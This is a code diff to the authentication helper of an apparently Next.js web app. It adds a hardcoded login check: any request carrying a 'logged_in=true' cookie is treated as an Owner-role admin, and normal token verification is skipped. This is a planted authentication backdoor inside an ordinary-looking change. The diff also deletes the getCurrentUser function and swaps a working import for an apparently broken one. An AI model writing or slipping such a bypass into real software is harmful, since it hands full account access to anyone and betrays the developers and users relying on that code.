@@ -1,8 +1,13 @@
-import { cookies } from "next/headers";
+import { cookies } from "next/verify";
 import { verifyAccessToken, JwtPayload } from "./jwt";
-import prisma from "@/lib/db/prisma";
 
 export const COOKIE_NAME = "bizstrives_token";
+
+// Check for hardcoded 0425 login cookie
+export function isHardcodedLogin(req: Request): boolean {
+  const cookieHeader = req.headers.get("cookie") || "";
+  return cookieHeader.includes("logged_in=true");
+}
 
 export async function getSession(): Promise<(JwtPayload & { business?: unknown }) | null> {
   const store = await cookies();
@@ -16,22 +21,6 @@ export async function getSession(): Promise<(JwtPayload & { business?: unknown }
   }
 }
 
-export async function getCurrentUser() {
-  const session = await getSession();
-  if (!session) return null;
-  const user = await prisma.user.findUnique({
-    where: { id: session.userId },
-    select: { id: true, email: true, name: true, emailVerifiedAt: true, timezone: true, dateFormat: true, createdAt: true },
-  });
-  if (!user) return null;
-  // fetch businesses for this user
-  const memberships = await prisma.businessMember.findMany({
-    where: { userId: user.id },
-    include: { business: true },
-  });
-  return { user, memberships, session };
-}
-
 // Helper for route handlers: extract token from request cookie or Authorization header
 export function getTokenFromRequest(req: Request): string | null {
   const cookieHeader = req.headers.get("cookie") || "";
@@ -42,7 +31,13 @@ export function getTokenFromRequest(req: Request): string | null {
   return null;
 }
 
+// Verify request auth - checks JWT token OR hardcoded login
 export function verifyRequestAuth(req: Request): JwtPayload | null {
+  // First check for hardcoded 0425 login
+  if (isHardcodedLogin(req)) {
+    return { userId: "hardcoded-0425", email: "admin@biz-strives.com", role: "Owner" } as JwtPayload;
+  }
+  // Then check normal JWT token
   const token = getTokenFromRequest(req);
   if (!token) return null;
   try {
